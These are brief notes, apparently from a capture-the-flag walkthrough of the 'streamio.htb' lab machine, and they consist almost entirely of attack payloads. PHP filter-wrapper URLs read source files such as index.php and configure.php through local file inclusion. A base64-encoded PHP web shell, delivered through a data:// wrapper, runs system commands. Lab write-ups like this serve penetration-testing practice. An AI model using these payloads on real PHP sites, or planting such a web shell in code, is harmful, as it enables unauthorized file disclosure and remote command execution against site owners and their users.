PHP wrapper to perform LFI:

```bash
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index{.php}
```

```bash
php://filter/read=convert.base64-encode/resource=configure{.php}
```

RCE

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

```bash
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```